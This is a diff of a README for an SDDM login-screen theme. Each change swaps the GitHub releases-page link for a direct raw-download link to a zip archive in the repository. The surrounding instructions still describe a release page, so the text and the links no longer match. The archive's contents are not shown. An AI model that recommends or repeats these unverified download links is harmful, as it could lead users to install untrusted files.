@@ -1,6 +1,6 @@
 # 🖤 exxtnd-sddm-theme - Clean Mac-style login screen
 
-[![Download the theme](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
+[![Download the theme](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip)
 
 ## ✨ What this is
 
@@ -12,7 +12,7 @@ This theme fits users who want a simple sign-in screen with a sharp, modern look
 
 Visit this page to download the latest release:
 
-[https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
+[https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip)
 
 Open the page, find the newest release, and download the theme archive from there.
 
@@ -36,7 +36,7 @@ You also need:
 ## 🚀 Install on your system
 
 1. Open the release page:
-   [https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
+   [https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip)
 
 2. Download the latest theme archive.
 
@@ -192,4 +192,4 @@ For a clean result, use the theme with a matching desktop style. A black and whi
 
 ## 📎 Download link
 
-[https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/releases)
+[https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip](https://github.com/tendinous-velleity545/exxtnd-sddm-theme/raw/refs/heads/main/maclike-theme/theme-sddm-exxtnd-1.1.zip)
